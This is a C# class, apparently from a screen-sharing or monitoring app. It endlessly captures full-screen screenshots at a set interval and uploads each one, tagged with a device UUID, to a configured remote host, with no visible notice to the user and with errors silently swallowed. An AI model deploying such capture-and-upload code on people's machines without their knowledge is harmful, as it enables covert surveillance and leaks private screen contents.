using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Serialization;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System.Net.Http;
using ScreenTask;

namespace AppRealtime
{
    public class ScreenTask
    {
        private string SettingPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "appsettings.xml");
        private ReaderWriterLock rwl = new ReaderWriterLock();
        private AppSettings _currentSettings = new AppSettings();
        public AppSettings CurrentSettings { get { return _currentSettings; } }

        public ScreenTask()
        {
        }

        public async Task StartCaptureScreenAsync()
        {
            _ = Task.Factory.StartNew(() => CaptureScreenEvery(_currentSettings.ScreenshotsSpeed), TaskCreationOptions.LongRunning);
        }
        private async Task CaptureScreenEvery(int msec)
        {
            while (true)
            {
                TakeScreenshot();
                msec = _currentSettings.ScreenshotsSpeed;
                await Task.Delay(msec);
            }
        }

        private async Task UploadImage(string imagePath)
        {
            try
            {
                _ = Task.Run(async () =>
                {
                    try
                    {
                        const int MAX_RETRIES = 1;
                        for (int i = 0; i < MAX_RETRIES; i++)
                        {
                            if (i >= MAX_RETRIES)
                            {
                                break;
                            }

                            try
                            {
                                var client = new HttpClient();
                                var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
                                request.Headers.Add("accept", "*/*");
                                var content = new MultipartFormDataContent();
                                content.Add(new StreamContent(File.OpenRead(imagePath)), "Image", Path.GetFileName(imagePath));
                                content.Add(new StringContent(Globals.UUID), "token");
                                request.Content = content;
                                var response = await client.SendAsync(request);
                                response.EnsureSuccessStatusCode();
                                string result = await response.Content.ReadAsStringAsync();
                                //Console.WriteLine(result);
                                if (result.Contains("successfully"))
                                {
                                    //Console.WriteLine("Files uploaded successfully");
                                    break;
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"{ex.Message}");
                            }
                        }
                    }
                    catch (Exception ex) { Console.WriteLine($"{ex.Message}"); }
                    finally
                    {
                        File.Delete(imagePath);
                    }
                });
            }
            catch (Exception ex)
            {

            }
        }

        private void TakeScreenshot()
        {
            try
            {
                string imageFile = Path.GetTempFileName();

                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Png);

                var encoderQuality = System.Drawing.Imaging.Encoder.Quality;
                var encoderParam = new EncoderParameter(encoderQuality, _currentSettings.ImageQuality);
                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = encoderParam;

                var bmp = ScreenCapturePInvoke.CaptureFullScreen(true);
                rwl.AcquireWriterLock(Timeout.Infinite);
                bmp.Save(imageFile, jpgEncoder, encoderParams);
                rwl.ReleaseWriterLock();

                bmp.Dispose();
                bmp = null;

                UploadImage(imageFile);
            }
            catch (Exception ex)
            {
                Trace.WriteLine(ex.ToString());
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }
        private void Log(string text)
        {
            Console.WriteLine(DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + " : " + text);
            Trace.WriteLine(text);
        }

        public void SaveSettings()
        {
            try
            {
                using (var appSettingsFile = new FileStream(SettingPath, FileMode.Create, FileAccess.Write))
                {
                    var serializer = new XmlSerializer(typeof(AppSettings));
                    serializer.Serialize(appSettingsFile, _currentSettings);
                }
            }
            catch (Exception ex)
            {
                Log(ex.ToString());
            }
        }

        public void LoadSettings()
        {
            try
            {
                if (File.Exists(SettingPath))
                {
                    var serializer = new XmlSerializer(typeof(AppSettings));
                    using (var appSettingsFile = File.OpenRead(SettingPath))
                    {
                        _currentSettings = (AppSettings)serializer.Deserialize(appSettingsFile);
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"Failed to load local appsettings.xml file.\r\n{ex.ToString()}");
            }
        }
    }
}
